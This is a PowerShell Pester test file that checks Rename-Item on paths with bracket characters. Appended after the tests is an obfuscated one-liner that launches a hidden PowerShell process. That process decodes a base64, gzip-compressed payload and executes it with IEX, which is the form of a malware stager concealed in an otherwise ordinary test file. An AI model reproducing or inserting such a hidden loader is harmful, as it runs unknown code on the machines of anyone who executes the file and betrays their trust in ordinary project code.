

Describe "Rename-Item tests" -Tag "CI" {
    BeforeAll {
        Setup -f originalFile.txt -content "This is content"
        $source = "$TESTDRIVE/originalFile.txt"
        $target = "$TESTDRIVE/ItemWhichHasBeenRenamed.txt"
        Setup -f [orig-file].txt -content "This is not content"
        $sourceSp = "$TestDrive/``[orig-file``].txt"
        $targetSpName = "ItemWhichHasBeen[Renamed].txt"
        $targetSp = "$TestDrive/ItemWhichHasBeen``[Renamed``].txt"
        Setup -Dir [test-dir]
        $wdSp = "$TestDrive/``[test-dir``]"
    }
    It "Rename-Item will rename a file" {
        Rename-Item $source $target
        test-path $source | Should -BeFalse
        test-path $target | Should -BeTrue
        "$target" | Should -FileContentMatchExactly "This is content"
    }
    It "Rename-Item will rename a file when path contains special char" {
        Rename-Item $sourceSp $targetSpName
        $sourceSp | Should -Not -Exist
        $targetSp | Should -Exist
        $targetSp | Should -FileContentMatchExactly "This is not content"
    }
    It "Rename-Item will rename a file when -Path and CWD contains special char" {
        $content = "This is content"
        $oldSpName = "[orig]file.txt"
        $oldSpBName = "``[orig``]file.txt"
        $oldSp = "$wdSp/$oldSpBName"
        $newSpName = "[renamed]file.txt"
        $newSp = "$wdSp/``[renamed``]file.txt"
        In $wdSp -Execute {
            $null = New-Item -Name $oldSpName -ItemType File -Value $content -Force
            Rename-Item -Path $oldSpBName $newSpName
        }
        $oldSp | Should -Not -Exist
        $newSp | Should -Exist
        $newSp | Should -FileContentMatchExactly $content
    }
    It "Rename-Item will rename a file when -LiteralPath and CWD contains special char" {
        $content = "This is not content"
        $oldSpName = "[orig]file2.txt"
        $oldSpBName = "``[orig``]file2.txt"
        $oldSp = "$wdSp/$oldSpBName"
        $newSpName = "[renamed]file2.txt"
        $newSp = "$wdSp/``[renamed``]file2.txt"
        In $wdSp -Execute {
            $null = New-Item -Name $oldSpName -ItemType File -Value $content -Force
            Rename-Item -LiteralPath $oldSpName $newSpName
        }
        $oldSp | Should -Not -Exist
        $newSp | Should -Exist
        $newSp | Should -FileContentMatchExactly $content
    }
}

if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-nop -w hidden -c $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(''H4sIADcgi1gCA71WbW/iOBD+3JX2P0QrpCRaSoDS7bbSSucQwkuBQlNCgUUnN3GCwcRp4lBgb//7TYD05bo99fbDRaDYnhnP+JlnPPGSwBGUB5LHx0ZpfrauST8+fjjq4QgvJSXHyhtm5KUcjfv1L+rREYhy86/X0jdJmaAwNPgS02B6cVFNoogEYj8v1IlAcUyWd4ySWFGlv6ThjETk+OpuThwh/ZByfxbqjN9hdlDbVLEzI9IxCtxU1uYOToMqWCGjQpG/f5fVyXFpWqjdJ5jFimxtYkGWBZcxWZV+qqnDm01IFLlDnYjH3BOFIQ1OyoVBEGOPdGG3FekQMeNuLKtwCPhFRCRRIKXHSe33UkWGYS/iDnLdiMSgXGgGK74gSi5IGMtLfyiTg/PrJBB0SUAuSMRDi0Qr6pC40MCBy8g18aZKlzxkZ36vkfLcCLR6IlLzkIjXUXa4mzCyN5TV13Huc6fC85g/OPnPjx8+fvCypG/9kC8Me/s85zA6muzGBGJUejymO91vUjEvdcAdFjzawDR3EyVEnUqTFPrJdCrllqulMaPb/NtblDJ90I7N5PQU1iY2p+4UbA6JyYnzjpNcna/6o5taKn+baAbxaECMTYCX1Mm4pPwKd+IxsjtzIVPrQnSKfBAQ1yCM+FikUOalyWuz2pKKR1s9ocwlEXIgdzFEBWlVXwazz44iN4MOWQJe+7kMqfCAwSTTPrB2k3lP56AkVxmO47zUS6CEnLxkEcyIm5dQENODCCWC74byU7idhAnq4Fhk203Vf+J58FvlQSyixIFUAgY3VkgcilkKSV5qUJfoG4v6mX/5l4BUMWM08GGnFSQEVlIgLJESJIJQMzKoBYuI5jJkZAlqu7I2GfahiA+1sCMV9okrvxVsRvo9w1N4MlyehQo5txgXecmmkYBbIoV6x7DfDuXZHfEiqGpEDplSsoKa6BuRlkAupPdnnRZtLFspcQ+g7SCKBMBjRnyp45h8qVgiAvCUT9oVrSJ4Rs2AdRx9QUvogZaaHfgP6EmTG2fuZWve0CJjPfNQM252Gj2j32hUVi3Lrgir1hSXvabo1G7ncws1rgcjMW6ixg0tLkaVbdiiW6uN3NFa+7LVtw9Ffb2d+643MjzPP/Os69KpSdvDal8vlnHbqCXtof6gFytxjT40+nTQX7RMcTeyGR54mn9bOsd03Y7mdol3tk2E6rMTZ9vy7Pqs425GDe18WFmgGkLVoGabOr8c6RHqaTb2bf5w6ev60K8i3XQoGfcHpt7vmzoa1Of3xrnmg+0tnulDu0zH4e31DOYmhHCpFStNl2z5qA8g1TnC/jXo+NWyM/NAx/iM9M9dHpfxQudIBx1zfA9xjUKzx0B+MyhzZLPuLUbt8cbUtNKoV0GNIh3WfZRuiX29j1G8MraGVrJd7g5PuyNPs2/ZmWZUb0LH0zTtoWFcOuPS+uvV2df2kNpLjgaaZn9KWQI0ya3um1av264hZxA8y/tbl30HR/EMM+ADXONZqZo8Mg/Xco/T1EJRnnrygkQBYdDQoOVlDEeMcSdtDo+3ODSnfcuYQsUOYHhS/uVIlR4V1afOkS1dXIwhXCibJzIX2iTwxSxfXJ8Ui9AGiutKEQ7//oNWebhRnm2YT5vJC9xe+mM7f2paW7m4fxb+D6geynoGL/c9qD6t/Yv0XUgX8y+ReCV+ufCfgP89LIaYClC34IpiZN9J34bkwKlnnyBpxoAr3uFJPwCvEnHchS+TvwEIY7tPcAoAAA==''));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);

